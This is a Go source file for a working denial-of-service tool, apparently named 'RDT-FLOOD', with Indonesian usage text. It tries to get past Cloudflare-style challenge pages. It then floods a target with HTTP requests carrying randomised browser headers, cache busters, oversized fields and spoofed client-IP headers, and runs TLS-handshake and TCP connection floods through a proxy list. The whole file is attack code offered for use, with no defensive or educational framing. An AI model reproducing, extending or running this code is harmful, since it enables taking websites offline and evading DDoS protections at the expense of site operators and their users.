package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk         = 1500
	to          = 5 * time.Second
	sub         = 2
	KEEP_ALIVE  = 60 * time.Second
	TLS_WORKERS = 500
	TCP_WORKERS = 300
)

var UA = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
	"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
}

var ACC = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"*/*",
}

var LAN = []string{
	"en-US,en;q=0.9,id;q=0.8",
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-US,en;q=0.8,id;q=0.7",
	"en-US,en;q=0.9,zh;q=0.8",
	"en-US,en;q=0.9,ja;q=0.8",
	"en-US,en;q=0.5",
	"en;q=0.9,id;q=0.1",
}

var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

var ENC = []string{
	"gzip, deflate, br",
	"gzip, deflate",
	"gzip",
	"br",
	"deflate",
	"identity",
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var CKS = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var PATH = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
	"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
	"/search", "/category/", "/tag/", "/feed/", "/comment/",
	"/user/", "/profile/", "/dashboard", "/settings", "/logout",
	"/login", "/register", "/forgot-password", "/reset-password",
	"/product", "/products", "/category/products", "/shop",
	"/cart", "/checkout", "/payment", "/success", "/cancel",
	"/blog", "/post", "/article", "/news", "/event",
	"/contact", "/about", "/team", "/career", "/faq",
}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
}

func HIN(ua string) (scu, scm, scp string) {
	scu = `"Not?A_Brand";v="99"`
	scm = "?0"
	scp = "Windows"
	var version string
	var major string
	if strings.Contains(ua, "Chrome/") {
		idx := strings.Index(ua, "Chrome/")
		if idx != -1 {
			start := idx + len("Chrome/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "Edg/") {
		idx := strings.Index(ua, "Edg/")
		if idx != -1 {
			start := idx + len("Edg/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else if strings.Contains(ua, "OPR/") {
		idx := strings.Index(ua, "OPR/")
		if idx != -1 {
			start := idx + len("OPR/")
			end := strings.Index(ua[start:], " ")
			if end == -1 {
				end = len(ua[start:])
			}
			version = ua[start : start+end]
			parts := strings.Split(version, ".")
			if len(parts) > 0 {
				major = parts[0]
				scu = fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not?A_Brand";v="99"`, major, major)
			}
		}
	} else {
		scu = ""
	}
	if strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
		scm = "?1"
		if strings.Contains(ua, "Android") {
			scp = "Android"
		} else {
			scp = "iOS"
		}
	} else if strings.Contains(ua, "Windows") {
		scp = "Windows"
	} else if strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X") {
		scp = "macOS"
	} else if strings.Contains(ua, "Linux") {
		scp = "Linux"
	}
	return
}

func RIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func RNP() string {
	return PATH[rand.Intn(len(PATH))]
}

var customCookie string = ""

func GTV(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return []string{rawURL}
	}
	host := u.Hostname()
	port := u.Port()
	path := u.Path
	if path == "" {
		path = "/"
	}
	query := u.RawQuery
	variations := []string{}
	addURL := func(s, h string) {
		full := s + "://" + h
		if port != "" {
			full += ":" + port
		}
		full += path
		if query != "" {
			full += "?" + query
		}
		variations = append(variations, full)
	}
	hosts := []string{host}
	if strings.HasPrefix(host, "www.") {
		hosts = append(hosts, host[4:])
	} else {
		hosts = append(hosts, "www."+host)
	}
	schemes := []string{"https", "http"}
	for _, s := range schemes {
		for _, h := range hosts {
			addURL(s, h)
		}
	}
	seen := map[string]bool{}
	unique := []string{}
	for _, v := range variations {
		if !seen[v] {
			seen[v] = true
			unique = append(unique, v)
		}
	}
	return unique
}

func ICP(body []byte) bool {
	lower := strings.ToLower(string(body))
	indicators := []string{
		"cloudflare", "just a moment", "checking your browser",
		"access denied", "blocked", "captcha", "challenge",
		"ddos", "security check", "verify you are human",
	}
	for _, ind := range indicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}
	if strings.Contains(lower, "<title>") {
		start := strings.Index(lower, "<title>") + 7
		end := strings.Index(lower[start:], "</title>")
		if end != -1 {
			title := lower[start : start+end]
			for _, ind := range indicators {
				if strings.Contains(title, ind) {
					return true
				}
			}
		}
	}
	return false
}

type PRT struct {
	url  string
	code int
	err  error
}

func PWR(ctx context.Context, client *http.Client, jobs <-chan string, results chan<- PRT) {
	for {
		select {
		case <-ctx.Done():
			return
		case rawURL, ok := <-jobs:
			if !ok {
				return
			}
			req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
			if err != nil {
				results <- PRT{url: rawURL, err: err}
				continue
			}
			ua := UA[rand.Intn(len(UA))]
			req.Header.Set("User-Agent", ua)
			req.Header.Set("Accept", ACC[rand.Intn(len(ACC))])
			req.Header.Set("Accept-Language", LAN[rand.Intn(len(LAN))])
			req.Header.Set("Accept-Encoding", ENC[rand.Intn(len(ENC))])
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
				if secChUA, _, _ := HIN(ua); secChUA != "" {
					req.Header.Set("Sec-Ch-Ua", secChUA)
					req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
					req.Header.Set("Sec-Ch-Ua-Platform", "Windows")
				}
			}
			req.Header.Set("Referer", REF[rand.Intn(len(REF))]+"query")
			req.Header.Set("X-Forwarded-For", RIP())
			resp, err := client.Do(req)
			if err != nil {
				results <- PRT{url: rawURL, err: err}
				continue
			}
			bodyBytes, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if ICP(bodyBytes) {
				results <- PRT{url: rawURL, code: resp.StatusCode, err: fmt.Errorf("challenge page")}
				continue
			}
			results <- PRT{url: resp.Request.URL.String(), code: resp.StatusCode, err: nil}
		}
	}
}

func RES(target, cookie string) (string, error) {
	variations := GTV(target)
	commonPaths := []string{"/", "/index.html", "/home", "/main", "/api/health", "/status", "/ping"}
	extra := []string{}
	for _, v := range variations {
		parsed, _ := url.Parse(v)
		if parsed != nil {
			base := parsed.Scheme + "://" + parsed.Host
			for _, p := range commonPaths {
				if p != "/" {
					extraVar := base + p
					if parsed.RawQuery != "" {
						extraVar += "?" + parsed.RawQuery
					}
					extra = append(extra, extraVar)
				}
			}
			clean := base + parsed.Path
			if clean != v {
				extra = append(extra, clean)
			}
		}
	}
	variations = append(variations, extra...)
	seen := map[string]bool{}
	unique := []string{}
	for _, v := range variations {
		if !seen[v] {
			seen[v] = true
			unique = append(unique, v)
		}
	}
	variations = unique
	rand.Shuffle(len(variations), func(i, j int) { variations[i], variations[j] = variations[j], variations[i] })
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Timeout: 15 * time.Second,
		Jar:     jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("Too many redirects")
			}
			return nil
		},
		Transport: &http.Transport{
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:     false,
			MaxIdleConns:          100,
			MaxIdleConnsPerHost:   100,
			IdleConnTimeout:       10 * time.Second,
			ForceAttemptHTTP2:     true,
			ResponseHeaderTimeout: 3 * time.Second,
		},
	}
	if cookie != "" {
		parsedTarget, _ := url.Parse(target)
		if parsedTarget != nil {
			cookieMap := map[string]string{}
			for _, c := range strings.Split(cookie, "; ") {
				parts := strings.SplitN(c, "=", 2)
				if len(parts) == 2 {
					cookieMap[parts[0]] = parts[1]
				}
			}
			var cookies []*http.Cookie
			for name, value := range cookieMap {
				cookies = append(cookies, &http.Cookie{
					Name:   name,
					Value:  value,
					Path:   "/",
					Domain: parsedTarget.Hostname(),
				})
			}
			client.Jar.SetCookies(parsedTarget, cookies)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	jobs := make(chan string, len(variations))
	results := make(chan PRT, len(variations))
	numWorkers := 10
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			PWR(ctx, client, jobs, results)
		}()
	}
	for _, v := range variations {
		jobs <- v
	}
	close(jobs)
	go func() {
		wg.Wait()
		close(results)
	}()
	var lastErr error
	for res := range results {
		if res.err == nil && res.code == http.StatusOK {
			cancel()
			return res.url, nil
		}
		if res.err != nil {
			lastErr = res.err
		}
	}
	if lastErr != nil {
		return "", fmt.Errorf("Failed : %v", lastErr)
	}
	return "", fmt.Errorf("Failed Bypassed")
}

func RWR(client *http.Client, req *http.Request, maxRedirects int) (*http.Response, error) {
	var resp *http.Response
	var err error
	currentReq := req
	for i := 0; i <= maxRedirects; i++ {
		resp, err = client.Do(currentReq)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode < 300 || resp.StatusCode >= 400 {
			return resp, nil
		}
		loc, err := resp.Location()
		if err != nil {
			return resp, nil
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		newReq, err := http.NewRequest("GET", loc.String(), nil)
		if err != nil {
			return nil, err
		}
		newReq.Header = currentReq.Header.Clone()
		currentReq = newReq
	}
	return resp, fmt.Errorf("Too many redirect %d", maxRedirects)
}

func tlsHandshakeFlood(ctx context.Context, host string, port string, proxies []*url.URL) {
	var wg sync.WaitGroup
	for i := 0; i < TLS_WORKERS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ctx.Err() == nil {
				var dialer net.Dialer
				dialer.Timeout = 2 * time.Second
				var conn net.Conn
				var err error
				if len(proxies) > 0 && proxies[0] != nil {
					proxy := proxies[rand.Intn(len(proxies))]
					proxyAddr := proxy.Host
					if proxy.Scheme == "http" || proxy.Scheme == "https" {
						conn, err = dialer.DialContext(ctx, "tcp", proxyAddr)
						if err == nil {
							connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
							_, err = conn.Write([]byte(connectReq))
							if err == nil {
								buf := make([]byte, 1024)
								n, _ := conn.Read(buf)
								if n > 0 && strings.Contains(string(buf[:n]), "200") {
								} else {
									conn.Close()
									continue
								}
							} else {
								conn.Close()
								continue
							}
						}
					}
				} else {
					conn, err = dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
				}
				if err != nil {
					continue
				}
				cipherSuites := []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_RSA_WITH_AES_128_CBC_SHA,
					tls.TLS_RSA_WITH_AES_256_CBC_SHA,
					tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
					tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
				}
				rand.Shuffle(len(cipherSuites), func(i, j int) { cipherSuites[i], cipherSuites[j] = cipherSuites[j], cipherSuites[i] })
				selected := cipherSuites[:rand.Intn(4)+4]
				tlsConfig := &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         host,
					MinVersion:         tls.VersionTLS12,
					MaxVersion:         tls.VersionTLS13,
					CipherSuites:       selected,
					NextProtos:         []string{"h2", "http/1.1"},
				}
				tlsConn := tls.Client(conn, tlsConfig)
				tlsConn.SetDeadline(time.Now().Add(3 * time.Second))
				err = tlsConn.Handshake()
				if err == nil {
					tlsConn.Close()
				} else {
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func tcpFlood(ctx context.Context, host string, port string, proxies []*url.URL) {
	var wg sync.WaitGroup
	for i := 0; i < TCP_WORKERS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ctx.Err() == nil {
				var dialer net.Dialer
				dialer.Timeout = 1 * time.Second
				var conn net.Conn
				var err error
				if len(proxies) > 0 && proxies[0] != nil {
					proxy := proxies[rand.Intn(len(proxies))]
					proxyAddr := proxy.Host
					conn, err = dialer.DialContext(ctx, "tcp", proxyAddr)
					if err == nil {
						connectReq := fmt.Sprintf("CONNECT %s:%s HTTP/1.1\r\nHost: %s:%s\r\n\r\n", host, port, host, port)
						conn.Write([]byte(connectReq))
						conn.SetReadDeadline(time.Now().Add(1 * time.Second))
						buf := make([]byte, 128)
						n, _ := conn.Read(buf)
						if n > 0 && strings.Contains(string(buf[:n]), "200") {
						}
						conn.Close()
					}
				} else {
					conn, err = dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
					if err == nil {
						conn.Close()
					}
				}
			}
		}()
	}
	wg.Wait()
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara make nya : <name file> <target> <duration> <cookie>")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}
	finalURL, err := RES(tgt, customCookie)
	if err != nil {
		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Printf("ޗ | Bypass Gagal : %v\n", err)
		os.Exit(1)
	}
	if finalURL != tgt {
		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Printf("ޗ | Bypass : %s\n", finalURL)
		tgt = finalURL
	} else {
		fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Println("ޗ | Bypass : Activated!")
	}
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	port := parsed.Port()
	if port == "" {
		if parsed.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}
	wcs := make([]CLI, len(proxies))
	for i, PROXYLINK := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   3 * time.Second,
			ResponseHeaderTimeout: 2 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		ip := ""
		if PROXYLINK != nil {
			tr.Proxy = http.ProxyURL(PROXYLINK)
			ip = PROXYLINK.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}
	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
	fmt.Printf("ޗ | Target : %s\n", tgt)
	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   : %d | %d | %d |\n", wrk, TLS_WORKERS, TCP_WORKERS)
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie : False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}
	var wg sync.WaitGroup
	methods := []string{"GET", "HEAD", "OPTIONS", "TRACE"}
	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI) {
			defer wg.Done()
			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func() {
					defer swg.Done()
					for ctx.Err() == nil {
						method := methods[rand.Intn(len(methods))]
						param := CBP[rand.Intn(len(CBP))]
						reqURL := tgt
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
						} else {
							reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
						}
						if rand.Intn(2) == 0 {
							reqURL += "&big=" + strings.Repeat("x", 2048+rand.Intn(2048))
						}
						if rand.Intn(10) == 0 {
							reqURL += "&" + RNS(8) + "=" + RNS(12)
						}
						req, _ := http.NewRequest(method, reqURL, nil)
						ua := UA[rand.Intn(len(UA))]
						if rand.Intn(3) == 0 {
							ua += strings.Repeat(" ", 1000) + "extra"
						}
						req.Header.Set("User-Agent", ua)
						req.Header.Set("Accept", ACC[rand.Intn(len(ACC))])
						req.Header.Set("Accept-Language", LAN[rand.Intn(len(LAN))])
						req.Header.Set("Accept-Encoding", ENC[rand.Intn(len(ENC))])
						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
						if rand.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
						}
						if rand.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
						}
						if rand.Intn(3) == 0 {
							req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rand.Int63()))
						}
						if rand.Intn(2) == 0 {
							req.Header.Set("X-Real-IP", RIP())
						}
						if rand.Intn(2) == 0 {
							req.Header.Set("CF-Connecting-IP", RIP())
						}
						if rand.Intn(2) == 0 {
							req.Header.Set("CDN-Loop", "cloudflare")
						}
						var cookies []string
						if customCookie != "" {
							cookies = append(cookies, customCookie)
						}
						for _, name := range CKS {
							if rand.Intn(2) == 0 {
								cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
							}
						}
						if rand.Intn(2) == 0 {
							cookies = append(cookies, "big="+strings.Repeat("x", 4096))
						}
						if len(cookies) > 0 {
							req.Header.Set("Cookie", strings.Join(cookies, "; "))
						}
						if rand.Intn(8) != 0 {
							ref := REF[rand.Intn(len(REF))]
							req.Header.Set("Referer", ref+host+strings.Repeat("a", 100))
						}
						if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
							scu, scm, scp := HIN(ua)
							if scu != "" {
								req.Header.Set("Sec-Ch-Ua", scu)
								req.Header.Set("Sec-Ch-Ua-Mobile", scm)
								req.Header.Set("Sec-Ch-Ua-Platform", scp)
							}
						}
						req.Header.Set("Sec-Fetch-Site", "none")
						req.Header.Set("Sec-Fetch-Mode", "navigate")
						req.Header.Set("Sec-Fetch-Dest", "document")
						PID := cli.ip
						if PID == "" {
							PID = RIP()
						}
						req.Header.Set("X-Forwarded-For", PID+", "+RIP()+", "+RIP())
						req.Header.Set("X-Real-IP", PID)
						req.Header.Set("True-Client-IP", PID)
						if rand.Intn(5) == 0 {
							req.Header.Set("X-Forwarded-Proto", "https")
							req.Header.Set("X-Forwarded-Host", host)
							req.Header.Set("X-Forwarded-Port", port)
						}
						resp, err := RWR(cli.client, req, 3)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}()
			}
			swg.Wait()
		}(c)
	}
	go func() {
		tlsHandshakeFlood(ctx, host, port, proxies)
	}()
	go func() {
		tcpFlood(ctx, host, port, proxies)
	}()
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}

func RNS(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}
